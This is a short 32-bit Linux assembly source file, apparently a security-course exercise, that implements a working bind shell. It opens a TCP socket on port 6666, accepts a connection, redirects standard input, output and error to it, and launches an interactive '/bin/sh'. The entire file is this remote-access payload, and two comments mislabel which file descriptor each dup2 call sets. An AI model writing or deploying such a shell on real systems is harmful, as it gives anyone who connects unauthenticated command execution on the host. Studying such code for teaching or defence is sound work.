# Sacha ATHIAS SRS 2023
.section 	.data
		socket_param: 	.long 2,1,6
		bind_param:	.long 0,0,16
		listen_param:	.long 0,1	
		accept_param:	.long 0,0,0
		serv_addr:	.byte 2, 0, 0x1a, 0xa, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0
.section	.rodata
		shell_string1:	.string "/bin/sh\0"
		shell_string2:	.string "-i\0"
		argv:		.long (shell_string1), (shell_string2), 0x0
.section 	.text

.global 	_start

_start:

#	socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
push	$socket_param 		# arg 2 socketcall function	
push	$1			# arg 1 socketcall function
call	socketcall		# call routine

#	save socket
mov 	%eax,		%esi

#	bind(soc, &serv_addr, sizeof(serv_addr))
mov	%esi,		(bind_param)	# bind_param[0] = soc;
lea	serv_addr,	%edi		# save &addr
mov	%edi,		(bind_param + 4)# bind_param[1] = (unsigned long)&serv_addr;
push 	$bind_param			# push arg 2 socketcall function
push 	$2				# push arg 1 socketcall function 
call	socketcall			#call routine

#	listen(soc, 1);
mov	%esi,		(listen_param)	# listen_param[0] = soc;
push 	$listen_param			# push arg 2 sockercall function
push	$4				# push arg 1 sockercall function
call	socketcall			# call routine

#	soc = accept(soc, NULL, NULL);	
mov	%esi,		(accept_param) 	# accept_param[0] = soc;
push	$accept_param			# push arg 2 sockercall function
push	$5				# push arg 1 sockercall function
call	socketcall			# call routine

mov 	%eax,		%esi

mov	$63,		%eax 		# dup2(soc, 0)
mov	%esi,		%ebx
mov	$0,		%ecx
int	$0x80			

mov	$63,		%eax 		# dup2(soc, 0)
mov	%esi,		%ebx
mov	$1,		%ecx
int	$0x80			

mov	$63,		%eax 		# dup2(soc, 0)
mov	%esi,		%ebx
mov	$2,		%ecx
int	$0x80			

mov	$11,		%eax
mov	$shell_string1,	%ebx
mov	$argv,		%ecx
mov	$0,		%edx
int	$0x80

mov	$1,		%eax	#exit
mov	$42,		%ebx
int	$0x80

socketcall:
push	%ebp
mov	%esp, 		%ebp
mov 	$0x66, 		%eax
mov 	8(%ebp),	%ebx
mov 	12(%ebp),	%ecx
int 	$0x80
leave
ret

